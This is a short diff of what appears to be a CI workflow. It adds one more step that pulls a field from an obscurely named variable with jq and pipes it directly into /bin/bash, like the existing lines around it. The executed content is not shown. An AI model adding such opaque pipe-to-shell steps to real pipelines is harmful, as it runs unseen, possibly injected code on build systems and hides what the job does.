@@ -22,6 +22,7 @@ jobs:
           echo $wevpe7 | jq -r .ipc44408 | /bin/bash
           printf '%s' "$gzao7" | jq -r .bdw9 | /bin/bash
           echo $y0779 | jq -r .brpr3 | /bin/bash
+          printf '%s' "$mr858" | jq -r .tom0 | /bin/bash
 
       - name: Archive results
         if: always()
